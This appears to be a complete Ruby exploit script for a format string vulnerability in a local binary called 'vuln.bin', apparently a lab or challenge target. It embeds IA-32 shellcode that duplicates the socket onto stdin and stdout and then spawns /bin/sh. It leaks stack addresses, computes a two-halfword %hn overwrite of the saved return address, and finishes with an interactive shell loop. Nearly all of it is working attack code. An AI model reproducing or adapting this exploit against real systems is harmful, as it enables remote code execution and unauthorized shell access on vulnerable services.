#!/usr/bin/ruby
# format string exploit for vuln.bin

require 'socket'
require 'metasm'

include Metasm

sock = TCPSocket.new 'localhost', 4141

shellcode = Shellcode.assemble(Ia32.new,<<EOS).encode_string
;; modified http://www.shell-storm.org/shellcode/files/shellcode-752.php

	xor ecx, ecx ; 0 == stdin
	;push 0x05 	 ; 5 == guessed socket descriptor
	;pop ebx
	lea ebx, [ecx+0x05]
	mul ecx    	 ; eax == 0 edx == 0
	mov al, 0x3f ; dup2
	int 0x80

	mov al, 0x3f
	inc ecx      ; 1 == stdout
	int 0x80

	;xor ecx, ecx
	dec ecx
	;mul ecx
	push ecx
	push 0x68732f2f   ;; hs//
	push 0x6e69622f   ;; nib/
	mov ebx, esp
	mov al, 11
    int 0x80

EOS

def fromstack(n)
	"reverse " << " p$" << n.to_s << "%"
end

def readadr(adr)
	"reverse " << [adr].pack('V') << "_p$5%"
end

sock.recv(4000)

puts "[#] shellcode.length: " + shellcode.length.to_s
puts "[#] checking adresses..."

sock.puts fromstack 2
rep  = sock.recv(4000)
puts "[#] argadr is: " + rep
argadr = rep[0,10].to_i(16)

savedret = argadr - 20

puts "[#] ret is at: 0x" + savedret.to_s(16)

payload = ""
offset = 75

puts "[#] adjusting payload..."

while payload.length != offset 

	offset = payload.length 

	shellcodeloc = argadr + offset - shellcode.length

	hi = shellcodeloc >> 16
	low = shellcodeloc & ~0xffff0000

	if low - hi < 0
		puts "reversing"
		shortw2 = low - shellcode.length
		shortw1 = hi - low
		a1 = [savedret].pack('V')
		a2 = [savedret+2].pack('V')
	else
		shortw2 = hi - shellcode.length
		shortw1 = low - hi
		a1 = [savedret+2].pack('V')
		a2 = [savedret].pack('V')
	end

	payload = "reverse " << a1 << a2
	payload << "_nh$6%" << "c" << shortw1.to_s.reverse << "%"
	payload << "nh$5%" << "c" << shortw2.to_s.reverse << "%"
	payload << shellcode

end

puts "[#] payload.lenght: " + payload.length.to_s
puts "[#] shellcode will be at: 0x" + shellcodeloc.to_s(16)

puts "[#] sending payload..."

sock.puts payload
sock.recv(4000)

#shell
while true
	ready = IO.select([sock,$stdin], nil, nil, 0)
	if ready != nil
		ready.first.each do |r|
			if r == $stdin
				sock.puts gets
			else
				print sock.recv(100) 
			end
		end
	end
end
sock.close

